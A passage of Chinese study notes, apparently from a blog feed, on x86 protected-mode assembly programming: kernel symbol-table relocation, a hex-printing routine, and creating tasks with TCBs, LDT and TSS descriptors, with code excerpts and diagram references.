<h2 id="08-使用内循环依次取得内核SALT表中的每个条目并进行比较"><a href="#08-使用内循环依次取得内核SALT表中的每个条目并进行比较" class="headerlink" title="08. 使用内循环依次取得内核SALT表中的每个条目并进行比较"></a>08. 使用内循环依次取得内核SALT表中的每个条目并进行比较</h2><p>在上一节中：<mark>EDI</mark>增量为256字节、<mark>ESI</mark>增量为262字节。</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/7a4cc3780aa0afd2380c9944eb6f623b.png" class="">

<p>内循环：</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/61f71545c621852f4eebde07416d2585.png" class="">

<p>其中，字符串比较：</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/08bc6810d695962b147e3dc0edc4b404.png" class="">

<p>执行比较之前：</p>
<ul>
<li>现在段寄存器<mark>ES</mark>指向用户程序数据段；</li>
<li><mark>EDI</mark>指向用户程序符号地址检索表的某个条目；</li>
<li>段寄存器<mark>DS</mark>指向内核数据段；</li>
<li><mark>ESI</mark>指向内核符号地址检索表的某个条目；</li>
</ul>
<p>在检索表中，每个字符串的长度是<mark>256个字节 = 64个双字</mark>；<br>如果两个字符串相同，比较操作要进行64次，结束后零标志位ZF = 1;<br>如果两个字符串不同，比较操作中止，此时零标志位ZF = 0。</p>
<p>如果比较结束之后<mark>ZF = 1</mark>，表示字符串相同，执行重定位操作：</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/eebc49647b46d4e2b4c9efb4c3d2dbab.png" class="">

<p>具体过程看下面代码：</p>
<pre><code class="assembly">         mov ecx,64                         ;检索表中，每条目的比较次数 
         repe cmpsd                         ;每次比较4字节 
         jnz .b4
         mov eax,[esi]                      ;若匹配，esi恰好指向其后的地址数据
         mov [es:edi-256],eax               ;将字符串改写成偏移地址 
         mov ax,[esi+4]
         mov [es:edi-252],ax                ;以及段选择子 
</code></pre>
<h2 id="09-用户程序中使用内核编程接口读硬盘和显示文本"><a href="#09-用户程序中使用内核编程接口读硬盘和显示文本" class="headerlink" title="09. 用户程序中使用内核编程接口读硬盘和显示文本"></a>09. 用户程序中使用内核编程接口读硬盘和显示文本</h2><p>其中在内核跳转执行用户程序时，使用<mark>jmp far [0x08]</mark>指令，不需要在栈中压入返回地址；之前使用<mark>call</mark>指令需要在栈中压入返回地址，所以有栈的切换问题。</p>
<p>进入用户程序执行，使用内核例程。</p>
<pre><code class="assembly">SECTION code vstart=0

start:
    mov eax,ds
    mov fs,eax
    
    mov ss,[fs:stack_seg]      			;ss指向用户程序自己的栈段
    mov esp,stack_end
    
    mov ds,[fs:data_seg]				;ds指向用户程序自己的数据段
    
    mov ebx,message_1         			;ebx指向偏移地址
    call far [fs:PrintString]			;调用内核put_string例程
    
    mov eax,100                 		;逻辑扇区号100
    mov ebx,buffer              		;缓冲区偏移地址
    call far [fs:ReadDiskData]  		;段间调用
    
    mov ebx,message_2
    call far [fs:PrintString]
    
    mov ebx,buffer
    call far [fs:PrintString]           ;too.
    
    jmp far [fs:TerminateProgram]       ;将控制权返回到系统

code_end:
</code></pre>
<h2 id="10-虚拟机验证程序执行"><a href="#10-虚拟机验证程序执行" class="headerlink" title="10. 虚拟机验证程序执行"></a>10. 虚拟机验证程序执行</h2><p>先用Vhd Writer讲文件写入要读取的<mark>100号扇区</mark><br>再使用<mark>VirtualBox</mark>虚拟机测试代码</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/acbb223d65c87a95abe0c1c6a57a075a.png" class="">
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/68b455214947bd9ce839cd7b7c199545.png" class="">


<h2 id="11-以16进制形式显示一个双字以及PUSHAD、POPAD和XLAT指令的使用"><a href="#11-以16进制形式显示一个双字以及PUSHAD、POPAD和XLAT指令的使用" class="headerlink" title="11. 以16进制形式显示一个双字以及PUSHAD、POPAD和XLAT指令的使用"></a>11. 以16进制形式显示一个双字以及PUSHAD、POPAD和XLAT指令的使用</h2><p>在内核中实现了<mark>put_hex_dword</mark>例程：</p>
<pre><code class="assembly">    ;汇编语言程序是极难一次成功，而且调试非常困难。这个例程可以提供帮助
put_hex_dword:					;在当前光标处以十六进制形式显示
                                ;一个双字并推进光标
                                ;输入：EDX=要转换并显示的数字
                                ;输出：无
    pushad
    push ds
    
    mov ax,core_data_seg_sel    ;切换到核心数据段
    mov ds,ax
    
    mov ebx,bin_hex             ;指向核心数据段内的转换表
    mov ecx,8
.xlt:
    rol edx,4
    mov eax,edx
    and eax,0x0000000f
    xlat
    
    push ecx
    mov cl,al
    call put_char
    pop ecx
    
    loop .xlt
    
    pop ds
    popad
    
    retf
</code></pre>
<p>使用上述例程显示一个双字的16进制形式。</p>
<p>在内核数据段中定义了一个字符串：</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/5f0099e490a46b3416c67f91f594fa5c.png" class="">
<p>每个字符在字符串中的偏移正好可以代表其作为16进制的数字字符。</p>
<p>将32位二进制数分成8个4位，将每个4位二进制数据转化为16进制，再用值作为偏移去取出对应的字符显示出来即可。</p>
<p>其中<mark>pushad</mark>：每次先将<mark>ESP减4</mark>，<mark>ESP</mark>是先保存再压入。</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/ac6aa3c66215e25c2f6d1090953ec547.png" class="">
<p>对应的<mark>popad</mark>指令：</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/4c3b9f98064b65ba4890b24688071a4b.png" class="">
<p>其中<mark>xalt</mark>指令：</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/80dc47c15fb9439664aebc9dff90824c.png" class="">
<p>运行过程：将<mark>EDX</mark>循环左移4位，再备份到<mark>EAX</mark>中，<mark>EAX</mark>除了低四位外全部置零，就可以获取<mark>AL</mark>的值了。</p>
<p>课后作业：<br>使用<mark>put_hex_dword</mark>在屏幕上输出一串数字：</p>
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/7975a37ae207e8ef8dba0ae97b1d2ca9.png" class="">
<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/image-20221113171015954.png" class="" title="image-20221113171015954">
]]></content>
      <categories>
        <category>X86汇编：实模式到保护模式</category>
      </categories>
      <tags>
        <tag>用户程序编程接口及其实现</tag>
      </tags>
  </entry>
  <entry>
    <title>任务和任务的创建</title>
    <url>/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/</url>
    <content><![CDATA[<h2 id="01-任务：概念和组成"><a href="#01-任务：概念和组成" class="headerlink" title="01. 任务：概念和组成"></a>01. 任务：概念和组成</h2><p>内核时对整个计算机系统进行管理，管理软件和硬件。内核可以加载用户程序，对用户程序进行重定位，用户程序终止后还可以回收用户程序的资源，在编程时位用户程序提供API。</p>
<span id="more"></span>

<p>将内核和用户程序可以看作一个整体：任务</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/e96a335381e80d83917a5b98fe09493f.png" class="">

<p>在一个系统中只有一个内核，但可以有多个用户程序，即多任务系统。</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/1e64220c81caf3726dd50fce7fc21cf1.png" class="">

<p>GDT存放内核中的描述符，LDT存放每个任务中用户程序的描述符：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/1b0bd96b722758508e4edac8c83acde7.png" class="">

<p>每个任务还需要一个任务状态段：<mark>TSS（Task Status Segment)</mark>。</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/bc6f1d19eff4c8baa3afc8c26a8196fe.png" class="">


<h2 id="02-使用任务控制块保存任务的基本信息"><a href="#02-使用任务控制块保存任务的基本信息" class="headerlink" title="02. 使用任务控制块保存任务的基本信息"></a>02. 使用任务控制块保存任务的基本信息</h2><p>本节主要介绍了本章程序的结构，主要结构如下，本章程序有三个</p>
<ul>
<li>用户程序：<strong>c13_app1.asm</strong><ol>
<li>用户头部段</li>
<li>用户数据段</li>
<li>用户栈段</li>
<li>用户代码段</li>
<li>用户尾部段</li>
</ol>
</li>
<li>内核程序：<strong>c14_core.asm</strong><ol>
<li>定义常量存放选择子</li>
<li>内核程序头部段</li>
<li>内核公共例程段，就是一些例程和以前一样</li>
<li>内核数据段，一些文本信息、<mark>SALT</mark>等</li>
<li>内核代码段，有内核入口点<mark>start</mark>、创建任务控制块<mark>TCB（Task Control Block）</mark>记录任务的信息</li>
<li>内核尾部段</li>
</ol>
</li>
<li>引导程序：<strong>c13_mbr0.asm</strong><ol>
<li>创建必要的段描述符</li>
<li>进入保护模式</li>
<li>加载内核</li>
<li>创建内核的段描述符</li>
<li>使用<mark>jmp far</mark> 指令跳转执行内核</li>
</ol>
</li>
</ul>
<h2 id="03-将任务控制块加入任务控制块链表"><a href="#03-将任务控制块加入任务控制块链表" class="headerlink" title="03. 将任务控制块加入任务控制块链表"></a>03. 将任务控制块加入任务控制块链表</h2><p>本节主要讲解内核代码段中的<mark>append_to_tcb_link</mark>，在内核数据段定义标号<mark>tcb_chain dd 0</mark>，是一个指针，用来保存第一个任务控制块的线性基地址，称为头指针，为0表示链表为空没有任务。</p>
<p>其中<mark>任务控制块TBC</mark>的结构如下：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/ce3bc67dccb3b41f1febe9240302f413.png" class="">
<p>任务控制链表：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/ee187f1224874532ea372e7da9d13217.png" class="">
<p>清除<mark>TCB</mark>指针域：表明当前<mark>TCB</mark>是最后一个</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/3fbfe4df62a5f872cbf49f5b77a02957.png" class="">
<p>判断链表中是否为空，为空表示这是第一个<mark>TCB</mark>：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/18bca96edb3afcc2347f93c302822341.png" class="">
<p>若链表不为空，顺着链表找到最后一个<mark>TCB</mark>：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/e399cbf96b88e4333b5f044b82f246d5.png" class="">
<p>找到最后一个<mark>TCB</mark>，指向新的<mark>TCB</mark>，然后恢复压栈的内容并返回调用者：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/8b8849472c1019804866c7e05797ad3d.png" class="">


<h2 id="04-通过栈传递例程参数和立即数的压栈指令"><a href="#04-通过栈传递例程参数和立即数的压栈指令" class="headerlink" title="04. 通过栈传递例程参数和立即数的压栈指令"></a>04. 通过栈传递例程参数和立即数的压栈指令</h2><p>接上一节，在创建<mark>TCB</mark>之后接着加载和重定位用户程序并创建一个任务。使用<strong>callload_relocate_program</strong>调用例程<strong>load_relocate_program</strong>，使用栈传递参数，此时的栈是在引导程序中定义的4K字节、基地址为<strong>0x7c00</strong>的栈。<br>代码如下：</p>
<pre><code class="assembly">         push dword 50                      ;用户程序位于逻辑50扇区
         push ecx                           ;压入任务控制块起始线性地址 
       
         call load_relocate_program  
</code></pre>
<p>其中立即数的压栈指令：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/d10aafc7c601090eaf89826ba9335b01.png" class="">

<p><strong>push imm8：</strong></p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/f0947f4f65d29cd80eb688aa43360f92.png" class="">

<p><strong>push imm16：</strong></p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/ade7696522ed4dd6d4fa90da0f48ea0d.png" class="">

<p><strong>push imm32：</strong></p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/627a51a70090a1105c6077311c122057.png" class="">

<p>压栈可以不需要容器，即直接使用立即数，但是出栈需要有容器接着：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/b404d38251d64069081e94f8d38fb6c8.png" class="">
<p>其中处理器使用32位操作尺寸，压入一个双字，<mark>0x00000055</mark>。出栈使用32位寄存器<mark>EDX</mark>或者是一个<mark>dword修饰的内存地址</mark>。这里压栈和出栈的尺寸必须一致，否则会影响栈平衡。</p>
<h2 id="05-段寄存器的压栈和出栈以及栈的随机访问机制"><a href="#05-段寄存器的压栈和出栈以及栈的随机访问机制" class="headerlink" title="05. 段寄存器的压栈和出栈以及栈的随机访问机制"></a>05. 段寄存器的压栈和出栈以及栈的随机访问机制</h2><p>接上一节，进入<strong>load_relocate_program</strong>例程之后进行段寄存器的压栈操作：</p>
<pre><code class="assembly">load_relocate_program:                      ;加载并重定位用户程序
                                            ;输入: PUSH 逻辑扇区号
                                            ;      PUSH 任务控制块基地址
                                            ;输出：无 
         pushad
      
         push ds
         push es 
</code></pre>
<p>其中段寄存器的压栈操作：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/2ef30935b1b304720d708133a0879d04.png" class="">

<p>段寄存器的出栈操作：<strong>pop cs</strong>指令非法</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/ce5a6531157fcbe769f3ae15be1df14c.png" class="">

<p>接着执行命令：<br><code>mov ebp,esp                        ;为访问通过堆栈传递的参数做准备 </code></p>
<p>此时栈的分布：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/b69d353526e838f9c65efbc8549a4464.png" class="">

<p>使用<strong>EBP</strong>记录<strong>ESP</strong>的值，用来访问战中的参数，可以在不破坏栈顶指针<strong>ESP</strong>的情况下去访问栈中的其他数据</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/dfb12cdd8ede0931a90a06b31e0be0ba.png" class="">
<p>其中若使用<mark>BP或者EBP</mark>访问栈，那么默认的前缀是栈段<mark>SS</mark>。</p>
<h2 id="06-创建任务的局部描述符LDT"><a href="#06-创建任务的局部描述符LDT" class="headerlink" title="06. 创建任务的局部描述符LDT"></a>06. 创建任务的局部描述符LDT</h2><p>任务共有的部分安装在<strong>GDT</strong>，私有的部分安装在<strong>LDT</strong>中。</p>
<p>接上一节，在<strong>load_relocate_program</strong>例程中：申请创建LDT所需要的内存、加载用户程序、判断整个用户程序的尺寸，之后建立用户头部段描述符、使用例程<strong>fill_descriptor_in_ldt</strong>将描述符安装在LDT中。</p>
<p>申请LDT内存：LDT的大小可以自己设置，最大也是64K字节</p>
<pre><code class="assembly">         ;以下申请创建LDT所需要的内存
         mov ecx,160                        ;允许安装20个LDT描述符
         call sys_routine_seg_sel:allocate_memory
         mov [es:esi+0x0c],ecx              ;登记LDT基地址到TCB中
         mov word [es:esi+0x0a],0xffff      ;登记LDT初始的界限到TCB中  
</code></pre>
<p>申请过的<strong>LDT</strong>可以将之保存在<strong>TCB</strong>中</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/12109993c7e17ddfd5c8879bae856361.png" class="">

<p>登记过LDT的线性地址和界限值之后，接下来我们要从硬盘读取用户程序：将加载的用户程序的首地址也保存在<strong>TCB</strong>中。</p>
<pre><code class="assembly"> ;以下开始加载用户程序 
         mov eax,core_data_seg_sel
         mov ds,eax                         ;切换DS到内核数据段
       
         mov eax,[ebp+12*4]                 ;从堆栈中取出用户程序起始扇区号 
         mov ebx,core_buf                   ;读取程序头部数据     
         call sys_routine_seg_sel:read_hard_disk_0

         ;以下判断整个程序有多大
         mov eax,[core_buf]                 ;程序尺寸
         mov ebx,eax
         and ebx,0xfffffe00                 ;使之512字节对齐（能被512整除的数低 
         add ebx,512                        ;9位都为0 
         test eax,0x000001ff                ;程序的大小正好是512的倍数吗? 
         cmovnz eax,ebx                     ;不是。使用凑整的结果
      
         mov ecx,eax                        ;实际需要申请的内存数量
         call sys_routine_seg_sel:allocate_memory
         mov [es:esi+0x06],ecx              ;登记程序加载基地址到TCB中 
</code></pre>
<p>然后创建用户程序头部段描述符，将之安装在LDT中</p>
<pre><code class="assembly">         mov ebx,ecx                        ;ebx -&gt; 申请到的内存首地址
         xor edx,edx
         mov ecx,512
         div ecx
         mov ecx,eax                        ;总扇区数 
      
         mov eax,mem_0_4_gb_seg_sel         ;切换DS到0-4GB的段
         mov ds,eax

         mov eax,[ebp+12*4]                 ;起始扇区号 
  .b1:
         call sys_routine_seg_sel:read_hard_disk_0
         inc eax
         loop .b1                           ;循环读，直到读完整个用户程序

         mov edi,[es:esi+0x06]              ;获得程序加载基地址

         ;建立程序头部段描述符
         mov eax,edi                        ;程序头部起始线性地址
         mov ebx,[edi+0x04]                 ;段长度
         dec ebx                            ;段界限
         mov ecx,0x0040f200                 ;字节粒度的数据段描述符，特权级3 
         call sys_routine_seg_sel:make_seg_descriptor
      
         ;安装头部段描述符到LDT中 
         mov ebx,esi                        ;TCB的基地址
         call fill_descriptor_in_ldt               
</code></pre>
<h2 id="07-在当前任务的LDT中安装描述符"><a href="#07-在当前任务的LDT中安装描述符" class="headerlink" title="07. 在当前任务的LDT中安装描述符"></a>07. 在当前任务的LDT中安装描述符</h2><p>接上一节，在LDT中安装一个新的描述符</p>
<pre><code class="assembly">SECTION core_code vstart=0
;-------------------------------------------------------------------------------
fill_descriptor_in_ldt:                     ;在LDT内安装一个新的描述符
                                            ;输入：EDX:EAX=描述符
                                            ;          EBX=TCB基地址
                                            ;输出：CX=描述符的选择子  
</code></pre>
<p><strong>fill_descriptor_in_ldt</strong>例程中运行。</p>
<p>PS：CX在计算过程中溢出的进位不会影响ECX的高16位，而是会被丢弃。</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/0f5d7f1bb33536bbe7d31c87d29d3bd0.png" class="">

<p>更新<strong>TI位为1</strong>，表示在<strong>LDT</strong>中：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/7f2cbf0b0f1b4e73fa3749111e55d15a.png" class="">


<h2 id="08-LDT描述符的格式和创建"><a href="#08-LDT描述符的格式和创建" class="headerlink" title="08. LDT描述符的格式和创建"></a>08. LDT描述符的格式和创建</h2><p>描述符的分类：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/5aac46f717951bdd2dea3d68d46c2791.png" class="">

<p><mark>GDT</mark>的线性基地址存放在<mark>GDTR</mark>寄存器中，<mark>LDT=和</mark>TSS的线性基地址存放在<mark>GDT</mark>中，即<mark>LDT、TSS</mark>也有自己的段描述符，需要安装在<mark>GDT</mark>中。</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/e59e39f48ec6f9df891a080bf2abad4d.png" class="">
<p>描述符中的<mark>S位</mark>和<mark>TYPE</mark>字段：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/769a49d03264c86aa8d7f323422ae21f.png" class="">
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/6f62dba6c15ef8a90f6ef0af2a657ea1.png" class="">

<ul>
<li><strong>S=0</strong>表示系统描述符中，在系统描述符中21、22位是没有意义的置零即可</li>
<li><strong>TYPE = 0010</strong>表示为<strong>LDT描述符</strong></li>
</ul>
<p>在<strong>GDT</strong>中登记<strong>LDT</strong>描述符：</p>
<pre><code class="assembly">         ;在GDT中登记LDT描述符
         mov eax,[es:esi+0x0c]              ;LDT的起始线性地址
         movzx ebx,word [es:esi+0x0a]       ;LDT段界限
         mov ecx,0x00408200                 ;LDT描述符，特权级0
         call sys_routine_seg_sel:make_seg_descriptor
         call sys_routine_seg_sel:set_up_gdt_descriptor
         mov [es:esi+0x10],cx               ;登记LDT选择子到TCB中
</code></pre>
<p>其中：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/3db05c407cd5675e55fdc0cdaadb9392.png" class="">

<ul>
<li><strong>S = 0</strong>：表示系统描述符；</li>
<li><strong>TYPE = 0010</strong>：表示<strong>LDT</strong>描述符；</li>
<li><strong>P = 1</strong>：表示段存在；</li>
<li><strong>G = 0</strong>：表示段界限以字节为单位；</li>
</ul>
<h2 id="09-创建任务状态段TSS"><a href="#09-创建任务状态段TSS" class="headerlink" title="09. 创建任务状态段TSS\"></a>09. 创建任务状态段TSS\</h2><p>除了局部描述符表LDT，每个任务还应该有一个任务状态段TSS，TSS的基本长度是104个字节</p>
<p>接上一节，本节创建<strong>TSS</strong>，代码如下：</p>
<pre><code class="assembly">         ;创建用户程序的TSS
         mov ecx,104                        ;tss的基本尺寸
         mov [es:esi+0x12],cx              
         dec word [es:esi+0x12]             ;登记TSS界限值到TCB 
         call sys_routine_seg_sel:allocate_memory
         mov [es:esi+0x14],ecx              ;登记TSS基地址到TCB    
</code></pre>
<p>其中<strong>TSS</strong>的内存分布：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/6219d16607c30cad62c9818e5ff6d8ca.png" class="">
<p>若<mark>T位为1</mark>，在多任务环境中每次切换到该任务时，将引发一个调试异常中断，所以我们将此为置零。</p>
<p>然后创建完TSS就将LDT选择子从TCB任务控制块中写入TSS</p>
<pre><code class="assembly">         mov dx,[es:esi+0x10]               ;登记任务的LDT选择子
         mov [es:ecx+96],dx                 ;到TSS中 
</code></pre>
<h2 id="10-TSS描述符的格式和创建"><a href="#10-TSS描述符的格式和创建" class="headerlink" title="10. TSS描述符的格式和创建"></a>10. TSS描述符的格式和创建</h2><p>接上一节，本节在<mark>GDT</mark>中登记TSS描述符。<br>    将创建好的TSS描述符登记到GDT中，GDT登记完成后返回TSS选择子再存入TCB任务控制块中。</p>
<pre><code class="assembly">         ;在GDT中登记TSS描述符
         mov eax,[es:esi+0x14]              ;TSS的起始线性地址
         movzx ebx,word [es:esi+0x12]       ;段长度（界限）
         mov ecx,0x00408900                 ;TSS描述符，特权级0
         call sys_routine_seg_sel:make_seg_descriptor
         call sys_routine_seg_sel:set_up_gdt_descriptor
         mov [es:esi+0x18],cx               ;登记TSS选择子到TCB 
</code></pre>
<p><strong>TSS</strong>描述符格式：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/bfeaad06d3448d6d42ebd37f1ec5c946.png" class="">

<ul>
<li><strong>S = 0</strong>：表示为系统描述符</li>
<li><strong>TYPE中的B位（Busy）</strong>：此位由处理器根据任务的状态实时修改，我们创建时置零就好。</li>
</ul>
<h2 id="11-用带参数的RET指令返回调用者"><a href="#11-用带参数的RET指令返回调用者" class="headerlink" title="11. 用带参数的RET指令返回调用者"></a>11. 用带参数的RET指令返回调用者</h2><p>接上一节，本节从例程<mark>load_relocate_program</mark>返回调用者，在返回之前栈的状态：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/89bedf3bfdcf7a56a9f9c5745d796fc4.png" class="">

<p>在执行下列出栈指令之后：</p>
<pre><code class="assembly">         pop es                             ;恢复到调用此过程前的es段 
         pop ds                             ;恢复到调用此过程前的ds段
      
         popad 
</code></pre>
<p>栈的状态为：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/7bf9a54f2a7cbf0f21dd5c26c5a1157a.png" class="">

<p>然后执行返回指令：</p>
<pre><code>         ret 8                              ;丢弃调用本过程前压入的参数  
</code></pre>
<p>栈的状态：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/2de3214d8bf9a99c0f35e70e3d5dd025.png" class="">
<p>其中<strong>ret imm、retf imm</strong>指令：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/fdfe40783a41395117ef15e131ff7d12.png" class="">

<p>到目前为止的内存布局：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/e2aa71ca1a29a5b9f879751e458972b0.png" class="">


<h2 id="12-加载任务寄存器TR和局部描述符表寄存器LDTR"><a href="#12-加载任务寄存器TR和局部描述符表寄存器LDTR" class="headerlink" title="12. 加载任务寄存器TR和局部描述符表寄存器LDTR"></a>12. 加载任务寄存器TR和局部描述符表寄存器LDTR</h2><p>接上一节，接下来从<mark>load_relocate_program</mark>返回，之后要转到任务私有部分（用户程序）执行。</p>
<p>在多任务系统中，有多个任务、多个TSS、LDT。</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/7af42fc51d3fd107ac29d2e88d88fec8.png" class="">

<p>8086使用寄存器<mark>TR&amp;LDTR<mark>来存储<strong>TSS</strong>&amp;<strong>LDT</strong>的基地址和界限</mark></mark></p>
